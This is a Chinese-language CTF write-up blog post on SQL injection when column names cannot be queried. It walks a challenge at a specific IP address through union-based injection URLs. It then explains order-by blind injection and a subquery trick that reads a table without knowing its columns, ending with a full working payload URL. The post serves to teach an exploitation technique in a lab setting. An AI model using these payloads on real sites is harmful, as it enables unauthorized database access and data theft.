---
title: "一道题引发的无列名注入"
date: 2019-08-22T20:41:24+08:00
draft: false
tags: ['ctf']
categories: ['CTF笔记']
---

@Syst1m的考核题

<!--more-->
题目地址 http://152.136.179.79:18084/ 传入id=3为flag的id。

常规联合查询注入 
```
http://152.136.179.79:18084/?id=3 union select 1,2,3
```
三个字段
```
http://152.136.179.79:18084/?id=3 union select 1,2,(select table_name from information_schema.tables where table_schema=database())
```
拿到flag所在的表，继续查列名
```
http://152.136.179.79:18084/?id=3 union select 1,2,(select column_name from information_schema.columns where table_name='this_1s_th3_fiag_tab13')
```
死活查不出来，应该是过滤了column关键字，没有列名怎么查出来数据呢？？？

有两种方法
1. order by盲注
2. 子查询

本地测试建表

![20190822205338](https://y4er.com/img/uploads/20190822205338.png)

![20190822205621](https://y4er.com/img/uploads/20190822205621.png)

## order by盲注

order by用于根据指定的列对结果集进行排序。一般上是从0-9a-z这样排序，不区分大小写。

先来本地测试一下

![20190822210044](https://y4er.com/img/uploads/20190822210044.png)

可以看到我们构造的数据排在了第一行

![20190822210124](https://y4er.com/img/uploads/20190822210124.png)

仍然在第一行

![20190822210155](https://y4er.com/img/uploads/20190822210155.png)

当拿'q'和'pass'做比较时，我们构造的数据被排在了第二行。由此可以来根据不同的回显来逐位判断。

拿我们这道题来说

![20190822210915](https://y4er.com/img/uploads/20190822210915.png)

1的时候我们的数据在前

![20190822210948](https://y4er.com/img/uploads/20190822210948.png)

2的时候原始数据在前，说明第一位是1

然后判断第二位

![20190822211104](https://y4er.com/img/uploads/20190822211104.png)

1a的时候我们的数据在前

![20190822211144](https://y4er.com/img/uploads/20190822211144.png)

1b的时候原始数据在前，说明第二位是1a

由此逐位判断。

## 子查询

在无列名的情况下，用子查询可以很简单的将数据跑出来。

子查询是将一个查询语句嵌套在另一个查询语句中。在特定情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询（inner query）语句的查询结果，可以为外层查询（outer query）语句提供查询条件。

![20190822214132](https://y4er.com/img/uploads/20190822214132.png)

**这个语句将列名转换为了1,2,3**，这个时候列名就已知了，我们可以用子查询将数据归并。

![20190822214824](https://y4er.com/img/uploads/20190822214824.png)

此时就能查出来数据了，然后我们再来看这个题。

我们已知了表名为`this_1s_th3_fiag_tab13`，但是不知道这个表有几个字段

![20190822220530](https://y4er.com/img/uploads/20190822220530.png)

可以用联合查询的方式来判断字段数。

查出数据

![20190822220706](https://y4er.com/img/uploads/20190822220706.png)

拿到我们这个题里来

![20190822220930](https://y4er.com/img/uploads/20190822220930.png)

payload

```
http://152.136.179.79:18084/?id=3 union select 1,2,x.2 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from this_1s_th3_fiag_tab13)x
```

子查询真是个好东西👍

## 写在文后

本文介绍了两种无列名注入的方式，很巧妙的在没有列名的情况下查出来数据，在实际利用中更推荐用子查询的方式，毕竟盲注有可能费力不讨好。

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**